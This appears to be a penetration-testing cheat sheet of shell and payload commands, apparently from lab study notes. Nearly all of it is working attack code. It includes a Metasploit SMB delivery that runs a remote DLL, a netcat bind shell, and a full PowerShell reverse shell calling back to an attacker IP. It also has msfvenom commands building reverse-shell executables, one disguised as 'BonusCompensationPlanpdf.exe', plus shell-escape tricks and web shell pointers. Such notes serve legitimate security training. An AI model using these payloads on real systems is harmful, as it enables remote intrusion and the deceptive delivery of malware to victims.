
# Metepreter (Windows)

```powershell
# attack host
msfconsole -q
use exploit/windows/smb/smb_delivery
set target 0
set SRVHOST <kali-IP>
exploit

# window (copy cmd from msfconsole output)
rundll32.exe \\10.10.14.3\lEUZam\test.dll,0
```

# Bind Shells

## Linux

```bash
# target bind shells
nc -lvnp 1337

rm -f /tmp/f; mkfifo /tmp/f; cat /tmp/f | /bin/bash -i 2>&1 | nc -l 10.129.41.200 7777 > /tmp/f
```

```bash
# connect from attack host to target
nc -nv 10.129.41.200 7777
```

# Reverse Shells

## Windows

```powershell
powershell -nop -c "$client = New-Object System.Net.Sockets.TCPClient('10.10.14.158',443);$stream = $client.GetStream();[byte[]]$bytes = 0..65535|%{0};while(($i = $stream.Read($bytes, 0, $bytes.Length)) -ne 0){;$data = (New-Object -TypeName System.Text.ASCIIEncoding).GetString($bytes,0, $i);$sendback = (iex $data 2>&1 | Out-String );$sendback2 = $sendback + 'PS ' + (pwd).Path + '> ';$sendbyte = ([text.encoding]::ASCII).GetBytes($sendback2);$stream.Write($sendbyte,0,$sendbyte.Length);$stream.Flush()};$client.Close()"
```

# Msfvenom

## Staged and Stageless

Staged: **`windows/meterpreter/reverse_tcp`** → separated by `/` → sends a small stager first, then downloads the stage.

Stageless: **`windows/meterpreter_reverse_tcp`** → combined with `_` → sends the **entire payload at once**.

**Easy rule:** `/` = **staged** | `_` = **stageless**.

## Listing Payloads

```bash
msfvenom -l payloads
```

## Creating Stageless Payloads

```bash
# Linux
msfvenom -p linux/x64/shell_reverse_tcp LHOST=10.10.14.113 LPORT=443 -f elf > createbackup.elf

# Windows
msfvenom -p windows/shell_reverse_tcp LHOST=10.10.14.113 LPORT=443 -f exe > BonusCompensationPlanpdf.exe
```

# Spawning a TTY Shell with Python

```bash
python -c 'import pty; pty.spawn("/bin/sh")'
```

# Spawning Interactive Shells

```bash
/bin/sh -i

perl -e 'exec "/bin/sh";'
perl: exec "/bin/sh";

ruby: exec "/bin/sh"

lua: os.execute('/bin/sh')

awk 'BEGIN {system("/bin/sh")}'

find / -name nameoffile -exec /bin/awk 'BEGIN {system("/bin/sh")}' \;
find . -exec /bin/sh \; -quit

vim -c ':!/bin/sh'
# vim escape
vim
:set shell=/bin/sh
:shell
```

# WebShells

```bash
# Lau

# Antak
ls /usr/share/nishang/Antak-WebShell
```